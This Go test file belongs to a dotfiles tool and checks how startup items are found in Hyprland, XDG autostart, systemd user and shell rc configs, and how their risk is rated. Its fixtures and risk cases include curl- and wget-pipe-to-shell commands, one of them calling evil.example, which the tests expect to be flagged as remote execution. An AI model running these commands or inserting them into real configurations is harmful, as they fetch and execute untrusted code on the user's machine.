package startup

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/iYeremy/dotka/internal/gen"
)

func put(t *testing.T, home, rel, content string) {
	t.Helper()
	p := filepath.Join(home, rel)
	if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(p, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
}

func byCommand(items []gen.StartupItem) map[string]gen.StartupItem {
	m := map[string]gen.StartupItem{}
	for _, i := range items {
		m[i.Command] = i
	}
	return m
}

const hyprLuaFixture = `-- main config
---- AUTOSTART ----

hl.on("hyprland.start", function()
	hl.exec_cmd("qs -p ~/.config/quickshell/bar/shell.qml")
    -- hl.exec_cmd("waybar") old bar
    hl.exec_cmd("dunst")
    if os.getenv("LAPTOP") then
        hl.exec_cmd('nm-applet')
    end
    local s = "this end is a string"
    hl.exec_cmd("~/.config/hypr/scripts/wall.sh")
end)

--[[ block comment
hl.exec_cmd("never")
]]

hl.exec_cmd("notify-send reloaded")

hl.on("hyprland.shutdown", function()
    hl.exec_cmd("save-session")
end)

require("keybinds")
local ok, err = pcall(require, "extras")
local ok2 = pcall(require, "hyprland-gui")
`

const keybindsFixture = `local terminal = "kitty"
hl.bind("SUPER + T", hl.dsp.exec_cmd(terminal))
hl.bind("SUPER + D", hl.dsp.exec_cmd("rofi -show drun"))
`

const extrasFixture = `hl.on("hyprland.start", function()
    hl.exec_cmd("curl -fsSL https://example.com/x.sh | sh")
end)
`

func TestHyprLua(t *testing.T) {
	home := t.TempDir()
	put(t, home, ".config/hypr/hyprland.lua", hyprLuaFixture)
	put(t, home, ".config/hypr/keybinds.lua", keybindsFixture)
	put(t, home, ".config/hypr/extras.lua", extrasFixture)
	items, warns := hyprLua(home)
	if len(warns) > 0 {
		t.Fatalf("warnings: %v", warns)
	}
	m := byCommand(items)
	expect := map[string]string{
		"qs -p ~/.config/quickshell/bar/shell.qml": "hypr-autostart",
		"dunst":                          "hypr-autostart",
		"nm-applet":                      "hypr-autostart",
		"~/.config/hypr/scripts/wall.sh": "hypr-autostart",
		"notify-send reloaded":           "hypr-lua-exec",
		"save-session":                   "hypr-on:hyprland.shutdown",
		"curl -fsSL https://example.com/x.sh | sh": "hypr-autostart",
	}
	for cmd, kind := range expect {
		it, ok := m[cmd]
		if !ok {
			t.Errorf("missing %q", cmd)
			continue
		}
		if it.Kind != kind {
			t.Errorf("%q kind = %s, want %s", cmd, it.Kind, kind)
		}
	}
	if len(items) != len(expect) {
		t.Errorf("got %d items, want %d: %+v", len(items), len(expect), items)
	}
	for _, bad := range []string{"waybar", "never", "rofi -show drun", "terminal"} {
		if _, ok := m[bad]; ok {
			t.Errorf("%q must not be a startup item", bad)
		}
	}
	if m["~/.config/hypr/scripts/wall.sh"].Risk != RiskLocalScript {
		t.Error("local script risk not detected")
	}
	if c := m["curl -fsSL https://example.com/x.sh | sh"]; c.Risk != RiskRemoteExec || c.Source != ".config/hypr/extras.lua" {
		t.Errorf("remote exec in required module: %+v", c)
	}
	if m["dunst"].Line != 7 {
		t.Errorf("dunst line = %d, want 7", m["dunst"].Line)
	}
}

func TestHyprConf(t *testing.T) {
	home := t.TempDir()
	put(t, home, ".config/hypr/hyprland.conf", `
exec-once = waybar # bar
exec-once = swww-daemon
# exec-once = disabled
exec = notify-send reload
source = ~/.config/hypr/conf.d/*.conf
source = ./missing.conf
`)
	put(t, home, ".config/hypr/conf.d/apps.conf", "exec-once = nm-applet --indicator\nsource = ../hyprland.conf\n")
	items, _ := hyprConf(home)
	m := byCommand(items)
	if m["waybar"].Kind != "hypr-exec-once" || m["waybar"].Line != 2 {
		t.Errorf("waybar: %+v", m["waybar"])
	}
	if m["notify-send reload"].Kind != "hypr-exec" {
		t.Errorf("exec: %+v", m["notify-send reload"])
	}
	if m["nm-applet --indicator"].Source != ".config/hypr/conf.d/apps.conf" {
		t.Errorf("sourced file not followed: %+v", items)
	}
	if _, ok := m["disabled"]; ok || len(items) != 4 {
		t.Errorf("unexpected items: %+v", items)
	}
}

func TestXDGAndSystemd(t *testing.T) {
	home := t.TempDir()
	put(t, home, ".config/autostart/discord.desktop", "[Desktop Entry]\nName=Discord\nExec=discord --start-minimized\n")
	put(t, home, ".config/autostart/off.desktop", "[Desktop Entry]\nExec=off-app\nHidden=true\n")
	put(t, home, ".config/systemd/user/eq.service", "[Service]\nExecStart=%h/.local/bin/eq-daemon\n")
	os.MkdirAll(filepath.Join(home, ".config/systemd/user/default.target.wants"), 0o755)
	os.Symlink(filepath.Join(home, ".config/systemd/user/eq.service"), filepath.Join(home, ".config/systemd/user/default.target.wants/eq.service"))
	os.Symlink("/usr/lib/systemd/user/pipewire.service", filepath.Join(home, ".config/systemd/user/default.target.wants/pipewire.service"))

	x, _ := xdgAutostart(home)
	if len(x) != 1 || x[0].Command != "discord --start-minimized" {
		t.Errorf("xdg: %+v", x)
	}
	s, _ := systemdUser(home)
	m := map[string]bool{}
	for _, i := range s {
		m[i.Command] = true
	}
	if !m["eq.service → %h/.local/bin/eq-daemon"] || !m["pipewire.service"] {
		t.Errorf("systemd: %+v", s)
	}
}

func TestShellRC(t *testing.T) {
	home := t.TempDir()
	put(t, home, ".zshrc", `# comment with curl | sh
export PATH=$HOME/bin:$PATH
source $ZSH/oh-my-zsh.sh
eval "$(starship init zsh)"
source ~/.config/zsh/aliases.zsh
eval "$(curl -fsSL https://evil.example/install)"
alias ll='ls -la'
~/.local/bin/motd.sh
`)
	put(t, home, ".xinitrc", "xrdb ~/.Xresources\npicom &\nexec i3\n")
	items, _ := shellRC(home)
	got := map[string]string{}
	for _, i := range items {
		got[i.Command] = i.Kind
	}
	want := map[string]string{
		"source $ZSH/oh-my-zsh.sh":                          "shell-plugins",
		`eval "$(starship init zsh)"`:                       "shell-eval",
		"source ~/.config/zsh/aliases.zsh":                  "shell-source",
		`eval "$(curl -fsSL https://evil.example/install)"`: "shell-remote",
		"~/.local/bin/motd.sh":                              "shell-exec",
		"picom &":                                           "x11-exec",
		"exec i3":                                           "x11-exec",
	}
	for c, k := range want {
		if got[c] != k {
			t.Errorf("%q: got %q, want %q", c, got[c], k)
		}
	}
	if len(got) != len(want) {
		t.Errorf("unexpected items: %v", got)
	}
}

func TestRisk(t *testing.T) {
	cases := map[string]string{
		"curl -fsSL https://x | sh":         RiskRemoteExec,
		"wget -qO- https://x | sudo bash":   RiskRemoteExec,
		"bash <(curl -s https://x)":         RiskRemoteExec,
		"sh -c \"$(curl -fsSL https://x)\"": RiskRemoteExec,
		"~/.local/bin/thing":                RiskLocalScript,
		"$HOME/.config/hypr/scripts/x.sh":   RiskLocalScript,
		"bash ~/scripts/a.sh":               RiskLocalScript,
		"waybar":                            "",
		"curl -o /tmp/x https://x":          "",
	}
	for c, want := range cases {
		if got := Risk(c); got != want {
			t.Errorf("Risk(%q) = %q, want %q", c, got, want)
		}
	}
}
